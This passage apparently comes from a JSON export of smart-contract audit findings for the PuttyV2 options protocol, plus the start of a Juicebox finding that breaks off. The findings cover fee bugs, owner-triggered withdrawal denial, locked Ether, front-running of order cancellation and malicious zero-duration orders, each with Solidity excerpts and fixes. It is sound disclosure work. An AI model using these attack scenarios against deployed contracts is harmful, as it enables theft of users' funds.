For such derivatives the system will not be receiving fees are the fee is now formulated as a fraction of order strike.  Also, it can be a problem for OTM call options, when the option itself is nearly worthless, while the fee will be substantial as strike will be big. Say 1k ETH BAYC call doesn't have much value, but the associated fee will be 10x of usual fee, i.e. substantial, while there is nothing to justify that.  Marking this as medium severity as that's a design specifics that can turn off or distort core system fee gathering.  ## Proof of Concept  Currently fee is linked to the order strike which makes it vary heavily for different types of orders, for example deep ITM and OTM calls:  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L494-L506  ```solidity         // transfer strike to owner if put is expired or call is exercised         if ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {             // send the fee to the admin/DAO if fee is greater than 0%             uint256 feeAmount = 0;             if (fee > 0) {                 feeAmount = (order.strike * fee) / 1000;                 ERC20(order.baseAsset).safeTransfer(owner(), feeAmount);             }              ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);              return;         } ```  ## Recommended Mitigation Steps  Consider linking the fee to option premium as this is option value that cannot be easily manipulated and exactly corresponds to the trading volume of the system.  I.e. consider moving fee gathering to fillOrder:  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L322-L340  ```solidity         // transfer premium to whoever is short from whomever is long         if (order.isLong) {             ERC20(order.baseAsset).safeTransferFrom(order.maker, msg.sender, order.premium);         } else {             // handle the case where the user uses native ETH instead of WETH to pay the premium             if (weth == order.baseAsset && msg.value > 0) {                 // check enough ETH was sent to cover the premium                 require(msg.value == order.premium, \"Incorrect ETH amount sent\");                  // convert ETH to WETH and send premium to maker                 // converting to WETH instead of forwarding native ETH to the maker has two benefits;                 // 1) active market makers will mostly be using WETH not native ETH                 // 2) attack surface for re-entrancy is reduced                 IWETH(weth).deposit{value: msg.value}();                 IWETH(weth).transfer(order.maker, msg.value);             } else {                 ERC20(order.baseAsset).safeTransferFrom(msg.sender, order.maker, order.premium);             }         } ```  "}, {"title": "Create a short call order with non empty floor makes the option impossible to exercise and withdraw", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/369", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L296-L298   # Vulnerability details  ## Impact  **HIGH** - assets can be lost If a short call order is created with non empty floorTokens array, the taker cannot exercise. Also, the maker cannot withdraw after the expiration. The maker will still get premium when the order is filled. If the non empty floorTokens array was included as an accident, it is a loss for both parties: the taker loses premium without possible exercise, the maker loses the locked ERC20s and ERC721s. This bug is not suitable for exploitation to get a 'free' premium by creating not exercisable options, because the maker will lose the ERC20s and ERC721s without getting any strike. In that sense it is similar but different issue to the `Create a short put order with zero tokenAmount makes the option impossible to exercise`, therefore reported separately.   ## Proof of Concept  - [proof of concept](https://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L153-L202) - [reference case](https://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L194-L21://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L204-L226)  The proof of concept shows a scenario where babe makes an short call order with non empty `floorTokens` array. Bob filled the order, and now he has long call option NFT. He wants to exercise his option and calls `exercise`. There are two cases. - case 1: he calls exercise with empty `floorAssetTokenIds` array - case 2: he calls exercise with non-empty `floorAssetTokenIds` array with matching length to the `orders.floorTokens`  In the case1, [the input `floorAssetTokenIds` were checked to be empty for put orders](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L406), and his call passes this requirement. But eventually `_transferFloorsIn` was called and he gets `Index out of bounds` error, because `floorTokens` is not empty [which does not match with empty `floorAssetTokenIds`](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L627-L629). ```solidity // case 1   // PuttyV2.sol: _transferFloorsIn called by exercise   // The floorTokens and floorTokenIds do not match the lenghts   // floorTokens.length is not zero, while floorTokenIds.length is zero         ERC721(floorTokens[i]).safeTransferFrom(from, address(this), floorTokenIds[i]); ```  In the case2, [the input `floorAssetTokenIds` were checked to be empty for put orders](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L406), but it is not empty. So it reverts. ``` // case2 // PuttyV2.sol: exercise // non empty floorAssetTokenIds array is passed for put option, it will revert          !order.isCall             ? require(floorAssetTokenIds.length == order.floorTokens.length, \"Wrong amount of floor tokenIds\")             : require(floorAssetTokenIds.length == 0, \"Invalid floor tokenIds length\"); ```  After the option is expired, the maker - babe is trying to withdraw but fails due to the [same issue with the case1](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L516). ```solidity // maker trying to withdraw // PuttyV2.sol: withdraw    _transferFloorsOut(order.floorTokens, positionFloorAssetTokenIds[floorPositionId]); ```  Note on the poc: - The [test for case1 is commented out](https://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L182-L183) because foundry could not catch the revert. But by running the test with un-commenting these lines will show that the call reverts with `Index out of bounds`. - For the same reason the [withdraw](https://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L199-L200) also is commented out - The reference case just shows that it works as intended when the order does not contain non-empty `floorTokens`.  ## Tools Used  foundry  ## Recommended Mitigation Steps  It happens because the [`fillOrder` does not ensure](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L296-L298) the `order.floorTokens` to be empty when the order is short call.    "}, {"title": "Use of Solidity version 0.8.13 which has two known issues applicable to PuttyV2", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/348", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L2   # Vulnerability details  The solidity version 0.8.13 has below two issues applicable to PuttyV2 1) Vulnerability related to ABI-encoding. ref : https://blog.soliditylang.org/2022/05/18/solidity-0.8.14-release-announcement/ This vulnerability can be misused since the function hashOrder() and hashOppositeOrder() has applicable conditions. \"...pass a nested array directly to another external function call or use abi.encode on it.\"  2) Vulnerability related to 'Optimizer Bug Regarding Memory Side Effects of Inline Assembly' ref : https://blog.soliditylang.org/2022/06/15/solidity-0.8.15-release-announcement/ PuttyV2 inherits solidity contracts from openzeppelin and solmate, and both these uses inline assembly, and optimization is enabled while compiling.  ## Recommended Mitigation Steps Use recent Solidity version 0.8.15 which has the fix for these issues    "}, {"title": "[Denial-of-Service] Contract Owner Could Block Users From Withdrawing Their Strike", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/296", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L500   # Vulnerability details  ## Proof-of-Concept  When users withdraw their strike escrowed in Putty contract, Putty will charge a certain amount of fee from the strike amount. The fee will first be sent to the contract owner, and the remaining strike amount will then be sent to the users.  [https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L500](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L500)  ```solidity function withdraw(Order memory order) public {  ..SNIP..   // transfer strike to owner if put is expired or call is exercised  if ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {   // send the fee to the admin/DAO if fee is greater than 0%   uint256 feeAmount = 0;   if (fee > 0) {    feeAmount = (order.strike * fee) / 1000;    ERC20(order.baseAsset).safeTransfer(owner(), feeAmount);   }    ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);    return;  }  ..SNIP.. } ```  There are two methods on how the owner can deny user from withdrawing their strike amount from the contract  #### Method #1 - Set the `owner()` to `zero` address  Many of the token implementations do not allow transfer to `zero` address ([Reference](https://github.com/d-xo/weird-erc20#revert-on-transfer-to-the-zero-address)). Popular ERC20 implementations such as the following Openzeppelin's ERC20 implementation do not allow transfer to `zero` address, and will revert immediately if the `to` address (recipient) points to a `zero` address during a transfer.  [https://github.com/OpenZeppelin/openzeppelin-contracts/blob/5fbf494511fd522b931f7f92e2df87d671ea8b0b/contracts/token/ERC20/ERC20.sol#L226](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/5fbf494511fd522b931f7f92e2df87d671ea8b0b/contracts/token/ERC20/ERC20.sol#L226)  ```solidity function _transfer(     address from,     address to,     uint256 amount ) internal virtual {     require(from != address(0), \"ERC20: transfer from the zero address\");     require(to != address(0), \"ERC20: transfer to the zero address\");      _beforeTokenTransfer(from, to, amount);      uint256 fromBalance = _balances[from];     require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");     unchecked {         _balances[from] = fromBalance - amount;         // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by         // decrementing then incrementing.         _balances[to] += amount;     }      emit Transfer(from, to, amount);      _afterTokenTransfer(from, to, amount); } ```  It is possible for the owner to transfer the ownership to a `zero` address, thus causing the fee transfer to the contract owner to always revert. When the fee transfer always reverts, no one can withdraw their strike amount from the contract.  This issue will affect all orders that adopt a `baseAsset` that reverts when transferring to `zero` address.  #### Method #2 - If `baseAsset` is a ERC777 token  > Note: `owner()` could point to a contract or EOA account. By pointing to a contract, the contract could implement logic to revert whenever someone send tokens to it.  ERC777 contains a `tokensReceived` hook that will notify the recipient whenever someone sends some tokens to the recipient .   Assuming that the `baseAsset` is a ERC77 token, the recipient, which is the `owner()` in this case, could always revert whenever `PuttyV2` contract attempts to send the fee to recipient. This will cause the `withdraw` function to revert too. As a result, no one can withdraw their strike amount from the contract.  This issue will affect all orders that has ERC777 token as its `baseAsset`.  ## Impact  User cannot withdraw their strike amount and their asset will be stuck in the contract.  ## Recommended Mitigation Steps  It is recommended to adopt a [withdrawal pattern](https://docs.soliditylang.org/en/v0.8.15/common-patterns.html#withdrawal-from-contracts) for retrieving owner fee.  Instead of transferring the fee directly to owner address during withdrawal, save the amount of fee that the owner is entitled to in a state variable. Then, implement a new function that allows the owner to withdraw the fee from the `PuttyV2` contract.  Consider the following implementation. In the following example, there is no way for the owner to perform denial-of-user because the outcome of the fee transfer (succeed or fail) to the owner will not affect the user's strike withdrawal process.   This will give users more assurance and confidence about the security of their funds stored within Putty.  ```solidity mapping(address => uint256) public ownerFees;  function withdraw(Order memory order) public {  ..SNIP..     // transfer strike to owner if put is expired or call is exercised     if ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {         // send the fee to the admin/DAO if fee is greater than 0%         uint256 feeAmount = 0;         if (fee > 0) {             feeAmount = (order.strike * fee) / 1000;             ownerFees[order.baseAsset] += feeAmount         }          ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);          return;     }     ..SNIP.. }  function withdrawFee(address baseAsset) public onlyOwner {  uint256 _feeAmount = ownerFees[baseAsset];  ownerFees[baseAsset] = 0;  ERC20(baseAsset).safeTransfer(owner(), _feeAmount); } ```  "}, {"title": "Put options are free of any fees", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/285", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L450-L451   # Vulnerability details  ## Impact  Fees are expected to be paid whenever an option is exercised (as per the function comment on [L235](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L235)).  ### Put options  If a put option is exercised, the exerciser receives the strike price (initially deposited by the short position holder) denominated in `order.baseAsset`.  ### Call options  If a call option is exercised, the exerciser sends the strike price to Putty and the short position holder is able to withdraw the strike amount.  However, the current protocol implementation is missing to deduct fees for exercised put options. Put options are free of any fees.  ## Proof of Concept  The protocol fee is correctly charged for exercised calls:  [PuttyV2.withdraw](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L494-L506)  ```solidity // transfer strike to owner if put is expired or call is exercised if ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {     // send the fee to the admin/DAO if fee is greater than 0%     uint256 feeAmount = 0;     if (fee > 0) {         feeAmount = (order.strike * fee) / 1000;         ERC20(order.baseAsset).safeTransfer(owner(), feeAmount); // @audit DoS due to reverting erc20 token transfer (weird erc20 tokens, blacklisted or paused owner; erc777 hook on owner receiver side can prevent transfer hence reverting and preventing withdrawal) - use pull pattern @high  // @audit zero value token transfers can revert. Small strike prices and low fee can lead to rounding down to 0 - check feeAmount > 0 @high  // @audit should not take fees if renounced owner (zero address) as fees can not be withdrawn @medium     }      ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount); // @audit fee should not be paid if strike is simply returned to short owner for expired put @high      return; } ```  Contrary, put options are free of any fees:  [PuttyV2.sol#L450-L451](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L450-L451)  ```solidity // transfer strike from putty to exerciser ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike); ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Charge fees also for exercised put options.   "}, {"title": "Options with a small strike price will round down to 0 and can prevent assets to be withdrawn", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/283", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-putty-findings", "body": "# Lines of code\r \r https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L499-L500\r \r \r # Vulnerability details\r \r ## Impact\r \r Certain ERC-20 tokens do not support zero-value token transfers and revert. Using such a token as a `order.baseAsset` for a rather small option strike and a low protocol fee rate can lead to rounding down to 0 and prevent asset withdrawals for those positions.\r \r ## Proof of Concept\r \r [PuttyV2.sol#L499-L500](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L499-L500)\r \r ```solidity\r // send the fee to the admin/DAO if fee is greater than 0%\r uint256 feeAmount = 0;\r if (fee > 0) {\r     feeAmount = (order.strike * fee) / 1000;\r     ERC20(order.baseAsset).safeTransfer(owner(), feeAmount); // @audit-info zero-value ERC20 token transfers can revert for certain tokens\r }\r ```\r \r Some ERC20 tokens revert for zero-value transfers (e.g. `LEND`). If used as a `order.baseAsset` and a small strike price, the fee token transfer will revert. Hence, assets and the strike can not be withdrawn and remain locked in the contract.\r \r See [Weird ERC20 Tokens - Revert on Zero Value Transfers](https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers)\r \r **Example:**\r \r - `order.baseAsset` is one of those weird ERC-20 tokens\r - `order.strike = 999` (depending on the token decimals, a very small option position)\r - `fee = 1` (0.1%)\r \r $((999 * 1) / 1000 = 0.999)$ rounded down to 0 -> zero-value transfer reverting transaction\r \r ## Tools Used\r \r Manual review\r \r ## Recommended mitigation steps\r \r Add a simple check for zero-value token transfers:\r \r ```solidity\r // send the fee to the admin/DAO if fee is greater than 0%\r uint256 feeAmount = 0;\r if (fee > 0) {\r     feeAmount = (order.strike * fee) / 1000;\r \r     if (feeAmount > 0) {\r         ERC20(order.baseAsset).safeTransfer(owner(), feeAmount);\r     }\r }\r ```\r \r \r "}, {"title": "Fee is being deducted when Put is expired and not when it is exercised.", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/269", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-putty-findings", "body": "# Lines of code\r \r https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L495-L503\r https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L451\r \r \r # Vulnerability details\r \r ## Impact\r Fee is being deducted when Put is expired and not when it is exercised in `PuttyV2.sol`.\r Comment section of the `setFee()` function mentions `\"fee rate that is applied on exercise\"` which signifies that the fee amount is meant to be deducted from strike only when a position is being exercised (or has been exercised).\r \r But, in function `withdraw()` at [PuttyV2.solL#495-L503](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L495-L503)  the fee is being deducted even when the Put position is not exercised and has expired. \r \r Also, in function `exercise()` there is no fee deduction from the `order.strike` when the Put position is exercised and the strike is being transferred to the caller ([PuttyV2.solL#451](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L451)).\r \r This unintended deduction from assets of Put Shorter and the absence of fee deduction from strike when Put is exercised are directly impacting the assets and therefore marked as Medium Risk.\r \r ## Proof of Concept\r `if` condition present at [PuttyV2.solL#495](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L495) passes if `order.isCall` is `false` and `isExercised` is false.\r \r `feeAmount` becomes positive if `fee > 0` and it gets deducted from the `order.strike` which gets transferred to `msg.sender` at line number [PuttyV2.solL#503](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L503).\r \r ## Tools Used\r Manual Analysis\r \r ## Recommended Mitigation Steps\r 1. Update `if` condition at [PuttyV2.sol#L498](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L498) with `(fee > 0 && order.isCall && isExercised)`\r \r 2. Add feeAmount calculation and deduction after put is exercised and strike is transferred at [PuttyV2.sol#L451](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L451) as follows:\r \r ```solidity\r uint256 feeAmount = 0;\r if (fee > 0) {\r     feeAmount = (order.strike * fee) / 1000;\r     ERC20(order.baseAsset).safeTransfer(owner(), feeAmount);\r }\r ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);\r ```\r \r "}, {"title": "`fillOrder()` and `exercise()` may lock Ether sent to the contract, forever", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/226", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324 https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L338 https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L436   # Vulnerability details  ## Impact `fillOrder()` and `exercise()` have code paths that require Ether to be sent to them (e.g. using WETH as the base asset, or the provision of the exercise price), and therefore those two functions have the `payable` modifier. However, there are code paths within those functions that do not require Ether. Ether passed to the functions, when the non-Ether code paths are taken, is locked in the contract forever, and the sender gets nothing extra in return for it.   ## Proof of Concept Ether can't be pulled from the `order.maker` during the filling of a long order, so `msg.value` shouldn't be provided here: ```solidity File: contracts/src/PuttyV2.sol   #1  323           if (order.isLong) { 324               ERC20(order.baseAsset).safeTransferFrom(order.maker, msg.sender, order.premium); 325           } else { ``` https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L323-L325   If the `baseAsset` isn't WETH during order fulfillment, `msg.value` is unused: ```solidity File: contracts/src/PuttyV2.sol   #2  337               } else { 338                   ERC20(order.baseAsset).safeTransferFrom(msg.sender, order.maker, order.premium); 339               } ``` https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L337-L339   Same for the exercise of call options: ```solidity File: contracts/src/PuttyV2.sol   #3  435               } else { 436                   ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike); 437               } ``` https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L435-L437   ## Tools Used Code inspection  ## Recommended Mitigation Steps Add a `require(0 == msg.value)` for the above three conditions   "}, {"title": "Put option sellers can prevent exercise by specifying zero amounts, or non-existant tokens", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/223", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L453-L454   # Vulnerability details  ## Impact Put option buyers pay an option premium to the seller for the privilege of being able to 'put' assets to the seller and get the strike price for it rather than the current market price. If they're unable to perform the 'put', they've paid the premium for nothing, and essentially have had funds stolen from them.   ## Proof of Concept If the put option seller includes in `order.erc20Assets`, an amount of zero for any of the assets, or specifies an asset that doesn't currently have any code at its address, the put buyer will be unable to exercise the option, and will have paid the premium for nothing: ```solidity File: contracts/src/PuttyV2.sol   #1  453               // transfer assets from exerciser to putty 454               _transferERC20sIn(order.erc20Assets, msg.sender); ``` https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L453-L454   The function reverts if any amount is equal to zero, or the asset doesn't exist: ```solidity File: contracts/src/PuttyV2.sol   #2  593       function _transferERC20sIn(ERC20Asset[] memory assets, address from) internal { 594           for (uint256 i = 0; i < assets.length; i++) { 595               address token = assets[i].token; 596               uint256 tokenAmount = assets[i].tokenAmount; 597    598               require(token.code.length > 0, \"ERC20: Token is not contract\"); 599               require(tokenAmount > 0, \"ERC20: Amount too small\"); 600    601               ERC20(token).safeTransferFrom(from, address(this), tokenAmount); 602           } 603       } ``` https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L593-L603    ## Tools Used Code inspection   ## Recommended Mitigation Steps Verify the asset amounts and addresses during `fillOrder()`, and allow exercise if the token no longer exists at that point in time    "}, {"title": "Order cancellation is prone to frontrunning and is dependent on a centralized database", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/186", "labels": ["bug", "help wanted", "2 (Med Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L526-L535   # Vulnerability details  ## Impact  Order cancellation requires makers to call `cancel()`, inputting the order as a function parameter. This is the only cancellation method, and it can cause two issues.  This first issue is that it is an on-chain signal for MEV users to frontrun the cancellation and fill the order.  The second issue is the dependency to a centralized service for cancelling the order. As orders are signed off chain, they would be stored in a centralized database. It is unlikely that an end user would locally record all the orders they make. This means that when cancelling an order, maker needs to request the order parameters from the centralized service. If the centralized service goes offline, it could allow malicious parties who have a copy of the order database to fill orders that would have been cancelled otherwise.  ## Proof of Concept  1. Bob signs an order which gets recorded in Putty servers. 2. Alice mirrors all the orders using Putty APIs. 3. Putty servers go offline. 4. Bob wants to cancel his order because changing token prices makes his order less favourable to him. 5. Bob cannot cancel his order because Putty servers are down and he does not remember the exact amounts of tokens he used. 6. Alice goes through all the orders in her local mirror and fulfills the non-cancelled orders, including Bob's, with extremely favourable terms for herself.  ## Tools Used  Pen & paper.  ## Recommended Mitigation Steps  Aside from the standard order cancellation method, have an extra method to cancel all orders of a caller. This can be achieved using a \"minimum valid nonce\" state variable, as a mapping from user address to nonce.  ```solidity mapping(address => uint256) minimumValidNonce; ```  Allow users to increment their `minimumValidNonce`. Make sure the incrementation function do not allow incrementing more than `2**64` such that callers cannot lock themselves out of creating orders by increasing `minimumValidNonce` to `2**256-1` by mistake. Then, prevent filling orders if `order.nonce < minimumValidNonce`.  Another method to achieve bulk cancelling is using counters. For example, Seaport [uses counters](https://github.com/ProjectOpenSea/seaport/blob/171f2cd7faf13b2bf0455851499f1981274977f7/contracts/lib/CounterManager.sol), which is an extra order parameter that has to match the corresponding counter state variable. It allows maker to cancel all his orders by [incrementing the counter state variable by one](https://github.com/ProjectOpenSea/seaport/blob/171f2cd7faf13b2bf0455851499f1981274977f7/contracts/lib/Consideration.sol#L475-L478).   Either of these extra cancellation methods would enable cancelling orders without signalling to MEV bots, and without a dependency to a centralized database.  "}, {"title": "Order duration can be set to 0 by Malicious maker", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/107", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/main/contracts/src/PuttyV2.sol#L287   # Vulnerability details  ## Impact A malicious maker can set a minimum order duration as 0 which means order will instantly expire after filling. Taker will get only the withdraw option and that too with fees on strike price, thus forcing the taker to lose money in this meaningless transaction  ## Proof of Concept !. Maker creates an order with zero Order duration 2. Taker fills this order but the order instantly expires since duration was 0 3. Taker gets the only option to withdraw with fees on strike price  ## Recommended Mitigation Steps Enforce atleast x days of duration  "}, {"title": "`acceptCounterOffer()` May Result In Both Orders Being Filled", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/44", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584   # Vulnerability details  ## Impact  When a user is attempting to accept a counter offer they call the function [acceptCounterOffer()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584) with both the `originalOrder` to be cancelled and the new `order` to fill. It is possible for an attacker (or any other user who happens to call `fillOrder()` at the same time) to fill the `originalOrder` before `acceptCounterOffer()` cancels it.  The impact is that both `originalOrder` and `order` are filled. The `msg.sender` of `acceptCounterOffer()` is twice as leveraged as they intended to be if the required token transfers succeed.  ## Proof of Concept  [acceptCounterOffer()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584) calls `cancel()` on the original order, however it will not revert if the order has already been filled. ```solidity     function acceptCounterOffer(         Order memory order,         bytes calldata signature,         Order memory originalOrder     ) public payable returns (uint256 positionId) {         // cancel the original order         cancel(originalOrder);           // accept the counter offer         uint256[] memory floorAssetTokenIds = new uint256[](0);         positionId = fillOrder(order, signature, floorAssetTokenIds);     } ```  [cancel()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L526-L535) does not revert if an order has already been filled it only prevents future `fillOrder()` transactions from succeeding. ```solidity     function cancel(Order memory order) public {         require(msg.sender == order.maker, \"Not your order\");           bytes32 orderHash = hashOrder(order);           // mark the order as cancelled         cancelledOrders[orderHash] = true;           emit CancelledOrder(orderHash, order);     } ```  Therefore any user may front-run the `acceptCounterOffer()` transaction with a `fillOrder()` transaction that fills the original order. As a result the user ends up filling both `order` and `originalOrder`. Then `acceptCounterOffer()` cancels the `originalOrder` which is essentially a no-op since it's been filled and continues to fill the new `order` resulting in both orders being filled.  ## Recommended Mitigation Steps  Consider having `cancel()` revert if an order has already been filled. This can be done by adding the following line `require(_ownerOf[uint256(orderHash)] == 0)`.  "}, {"title": "Unsafe casts `uint256` to `int256` and `int256` to `uint256`", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/293", "labels": ["bug", "documentation", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L816 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L668 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L681 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L743 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L785 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L859   # Vulnerability 